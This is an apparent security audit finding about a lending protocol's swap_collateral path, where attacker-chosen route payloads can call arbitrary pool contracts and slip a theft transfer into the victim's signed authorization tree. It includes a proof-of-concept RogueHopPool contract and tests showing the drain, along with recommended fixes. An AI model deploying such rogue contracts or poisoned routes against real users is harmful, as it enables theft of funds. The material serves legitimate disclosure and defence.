### Title
Attacker-controlled swap routes can execute arbitrary contract code and drain unrelated caller tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The controller forwards caller-controlled `swap` bytes to the configured router and invokes it before completing settlement, while the router can invoke venue contracts named by that payload. [1](#0-0) [2](#0-1)   
A malicious route venue can request a token transfer directly from the top-level caller, causing transaction simulation to add that transfer beneath the caller’s `swap_collateral` authorization and enabling the theft if the caller signs the poisoned authorization tree. [3](#0-2) [4](#0-3) 

### Finding Description
`swap_collateral` accepts a caller-controlled `StrategySwap` payload and reaches `swap_tokens` through `withdraw_and_swap_from_supply`. [5](#0-4) [6](#0-5)   
`swap_tokens` snapshots only the controller’s input and output balances, authorizes the controller’s exact router input transfer, and then executes the opaque route. [7](#0-6)   
Those checks bound the controller’s routed balance, but they do not prevent route-selected code from performing another `require_auth`-protected call against the caller. [8](#0-7) [9](#0-8)   
The regression fixture demonstrates a route-selected `RogueHopPool` invoking `token.transfer(victim, attacker, amount)`, with simulation attaching that transfer as a child of the victim’s controller invocation. [10](#0-9) [11](#0-10) 

### Impact Explanation
An attacker who supplies a malicious route to a victim can steal any unrelated token held by that victim, not merely the collateral amount intended for the strategy. [12](#0-11) [13](#0-12)   
The theft executes only when the victim signs the simulated authorization tree containing the injected child transfer, matching the report’s malicious-configuration/user-interaction pattern. [14](#0-13)   
Because the route can target tokens never listed by the lending protocol, the controller’s final collateral, health-factor, measured-output, and router-overspend checks cannot bound the stolen amount. [8](#0-7) [15](#0-14) 

### Likelihood Explanation
The exploit requires a victim to submit an attacker-supplied `swap` payload and sign the authorization tree produced by simulation. [16](#0-15)   
The route is otherwise valid to the controller because the malicious venue can still return a fair output, allowing the expected strategy accounting and risk checks to pass. [17](#0-16) [13](#0-12)   
This makes the practical severity dependent on wallet or client disclosure of nested authorization entries, but the reachable impact is direct theft of user funds. [15](#0-14) 

### Recommendation
Constrain routes to governance-approved venue contracts or immutable adapters, rather than allowing route payloads to name arbitrary executable pool addresses. [1](#0-0) [2](#0-1)   
Clients should also decode every signed authorization tree and reject any child invocation other than the expected router input transfer before presenting the transaction for signature. [15](#0-14)   
A protocol-level allowlist is the stronger mitigation because an opaque route can produce a poisoned authorization tree that a user may sign without understanding the nested transfer. [4](#0-3) 

### Proof of Concept
1. Alice creates a normal collateralized account and holds `WALLET_BALANCE` of an unrelated token outside the protocol. [18](#0-17) 
2. An attacker provides Alice a `swap_collateral` route whose router-decoded `hop_pool` is a malicious contract. [5](#0-4) [19](#0-18) 
3. Alice calls `swap_collateral(caller=alice, account_id=alice_account, current=usdc_key, amount=5_000_000_000, new=eth_key, swap=malicious_route)`. [20](#0-19) [12](#0-11) 
4. The controller authorizes only its own exact input transfer to the configured router, then executes the supplied route. [7](#0-6) [21](#0-20) 
5. The malicious `hop_pool.swap` invokes `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`. [22](#0-21) 
6. Simulation records the malicious transfer as a child of Alice’s `swap_collateral` authorization; if Alice signs that tree, execution transfers the full unrelated wallet balance to the attacker while still crediting Alice the expected swap output. [23](#0-22)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L1-4)
```rust
//! What the host does when code inside a route hop calls
//! `token.transfer(caller, third_party, x)` below the controller: recording mode
//! attaches it to the caller's entry; enforcing mode accepts it only if signed.

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-23)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-47)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-100)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L17-23)
```rust
pub(crate) struct SwapCollateralParams<'a> {
    pub account_id: u64,
    pub current: &'a HubAssetKey,
    pub from_amount: i128,
    pub new: &'a HubAssetKey,
    pub swap: &'a StrategySwap,
}
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L27-31)
```rust
pub(crate) fn process_swap_collateral(
    env: &Env,
    caller: &Address,
    params: SwapCollateralParams<'_>,
) {
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** common/src/token.rs (L33-52)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}
```
